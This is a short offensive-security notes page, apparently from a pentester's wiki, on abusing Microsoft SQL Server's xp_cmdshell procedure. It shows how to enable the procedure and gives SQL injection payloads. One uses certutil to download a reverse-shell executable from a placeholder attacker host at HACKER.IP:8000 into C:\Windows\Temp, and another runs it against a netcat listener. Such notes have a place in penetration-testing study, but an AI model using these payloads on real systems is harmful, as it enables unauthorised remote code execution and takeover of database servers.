## xp_cmdshell
**xp_cmdshell** is a system-extended stored procedure in Microsoft SQL Server that enables the execution of operating system commands and programs from within SQL Server. It provides a mechanism for SQL Server to interact directly with the host operating system's command shell. 

Although old and mostly disabled by default, it is possible to manually enable **xp_cmdshell** in SQL Server through `EXECUTE` (**EXEC**) queries. Still, it requires the database user to be a member of the **sysadmin** fixed server role or have the `ALTER SETTINGS` server-level permission to execute this command.

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Once this is accomplished we can use [[Metasploit#Msfvenom |Msfvenom]] to set up a **reverse shell** in an executable and a python server so we can obtain **RCE** in the target machine

We then use the next payload so the target server runs the `certutil` command with the `-f` option that will make it download the executable, and place it in a temp folder.
```sql
'; EXEC xp_cmdshell 'certutil -urlcache -f http://HACKER.IP:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --
```

Finally we can set up a [[Netcat]] listener server and send another payload to run the executable and set up our **reverse shell**

```sql
'; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --
```
